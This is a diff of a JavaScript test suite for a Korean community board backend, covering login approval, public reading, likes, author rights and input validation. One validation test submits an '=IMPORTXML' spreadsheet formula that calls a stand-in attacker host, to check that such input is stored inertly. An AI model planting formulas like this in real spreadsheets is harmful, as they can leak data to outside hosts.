@@ -32,10 +32,10 @@ function server() {
   return {context,call,login,approve,db,props,profile,get fetches(){return fetches;}};
 }
 const denied = (fn,code)=>assert.throws(fn,e=>e.cicCode===code);
-const draft = () => ({title:'봉사 활동 기록',body:'오늘 함께한 활동',category:'activity',mutationId:randomUUID()});
+const draft = () => ({title:'봉사 활동 기록',summary:'오늘 함께한 활동을 카드에 남깁니다.',body:'오늘 함께한 활동',attachmentIds:[],category:'activity',mutationId:randomUUID()});
 
-test('anonymous users cannot read private posts and verified Google users are approved automatically',()=>{
-  const s=server();denied(()=>s.call('listPosts'),'AUTH');const a=s.login();assert.equal(a.member.status,'approved');assert.equal(s.call('listPosts',{},a.session).total,0);denied(()=>s.call('getPost',{id:'x'},a.session),'NOT_FOUND');
+test('anonymous users can read public posts while verified Google users are approved automatically',()=>{
+  const s=server();assert.equal(s.call('listPosts').total,0);const a=s.login();assert.equal(a.member.status,'approved');assert.equal(s.call('listPosts',{},a.session).total,0);denied(()=>s.call('getPost',{id:'x'}),'NOT_FOUND');
 });
 test('a legacy pending member is approved on their next verified Google login',()=>{
   const s=server(),a=s.login();const record=s.context.find_('Members',a.member.id);record.status='pending';s.context.save_('Members',record);const renewed=s.login();assert.equal(renewed.member.status,'approved');
@@ -58,6 +58,12 @@ test('members cannot approve themselves or publish notices',()=>{
 test('post retries are idempotent, private payloads do not expose emails',()=>{
   const s=server(),a=s.login();s.approve(a.member.id);const d=draft(),p=s.call('createPost',d,a.session).post;assert.equal(s.call('createPost',d,a.session).post.id,p.id);const list=s.call('listPosts',{},a.session);assert.equal(list.total,1);assert.equal(JSON.stringify(list).includes('a@example.org'),false);assert.equal(list.posts[0].body,undefined);
 });
+test('likes toggle once per member, expose only count publicly, and retain an audit row while liked',()=>{
+  const s=server(),a=s.login();const p=s.call('createPost',draft(),a.session).post;
+  let like=s.call('toggleLike',{postId:p.id},a.session);assert.equal(like.liked,true);assert.equal(like.likeCount,1);
+  const listed=s.call('listPosts');assert.equal(listed.posts[0].likeCount,1);assert.equal(listed.posts[0].likedByMe,false);assert.equal(Object.hasOwn(listed.posts[0],'memberId'),false);
+  assert.equal(s.context.rows_('Likes').length,1);like=s.call('toggleLike',{postId:p.id},a.session);assert.equal(like.liked,false);assert.equal(like.likeCount,0);assert.equal(s.context.rows_('Likes').length,0);
+});
 test('other members cannot change or delete someone else’s posts',()=>{
   const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;const b=s.login('google-user-b','b@example.org');s.approve(b.member.id);denied(()=>s.call('deletePost',{id:p.id,version:1},b.session),'FORBIDDEN');denied(()=>s.call('updatePost',{id:p.id,version:1,...draft()},b.session),'FORBIDDEN');
 });
@@ -68,10 +74,10 @@ test('comments enforce author rights and deleted parent hides all comments',()=>
   const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;const d={postId:p.id,body:'댓글입니다',mutationId:randomUUID()};const c=s.call('createComment',d,a.session).comment;assert.equal(s.call('createComment',d,a.session).comment.id,c.id);const b=s.login('b','b@example.org');s.approve(b.member.id);denied(()=>s.call('updateComment',{id:c.id,version:1,body:'남의 댓글 수정'},b.session),'FORBIDDEN');s.call('deletePost',{id:p.id,version:1},a.session);denied(()=>s.call('getPost',{id:p.id},a.session),'NOT_FOUND');denied(()=>s.call('createComment',{...d,mutationId:randomUUID()},a.session),'NOT_FOUND');
 });
 test('server rejects oversized and blank content and stores formulas as JSON text',()=>{
-  const s=server(),a=s.login();s.approve(a.member.id);denied(()=>s.call('createPost',{...draft(),title:' '},a.session),'INVALID');denied(()=>s.call('createPost',{...draft(),body:'a'.repeat(10001)},a.session),'INVALID');s.call('createPost',{...draft(),body:'=IMPORTXML("https://attacker.invalid","x")'},a.session);assert.equal(s.db.Posts[1][1][0],'{');
+  const s=server(),a=s.login();s.approve(a.member.id);denied(()=>s.call('createPost',{...draft(),title:' '},a.session),'INVALID');denied(()=>s.call('createPost',{...draft(),summary:' '},a.session),'INVALID');denied(()=>s.call('createPost',{...draft(),body:'a'.repeat(10001)},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'unsafe.pdf',mimeType:'application/pdf',size:1},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'large.mp4',mimeType:'video/mp4',size:100*1024*1024+1},a.session),'INVALID');s.call('createPost',{...draft(),body:'=IMPORTXML("https://attacker.invalid","x")'},a.session);assert.equal(s.db.Posts[1][1][0],'{');
 });
-test('admin approval and immediate blocking revoke access',()=>{
-  const s=server(),a=s.login(),admin=s.login('admin-sub','admin@example.org');assert.equal(admin.member.status,'approved');s.call('setMemberStatus',{id:a.member.id,status:'approved'},admin.session);assert.equal(s.call('me',{},a.session).member.status,'approved');s.call('setMemberStatus',{id:a.member.id,status:'blocked'},admin.session);denied(()=>s.call('listPosts',{},a.session),'AUTH');
+test('admin approval and immediate blocking revoke write access while public reading remains available',()=>{
+  const s=server(),a=s.login(),admin=s.login('admin-sub','admin@example.org');assert.equal(admin.member.status,'approved');s.call('setMemberStatus',{id:a.member.id,status:'approved'},admin.session);assert.equal(s.call('me',{},a.session).member.status,'approved');s.call('setMemberStatus',{id:a.member.id,status:'blocked'},admin.session);assert.equal(s.call('listPosts',{},a.session).total,0);denied(()=>s.call('createPost',draft(),a.session),'AUTH');
 });
 test('removing admin from server properties revokes privileges immediately',()=>{
   const s=server(),a=s.login('admin-sub','admin@example.org');s.props.ADMIN_EMAILS='another@example.org';denied(()=>s.call('listMembers',{},a.session),'FORBIDDEN');
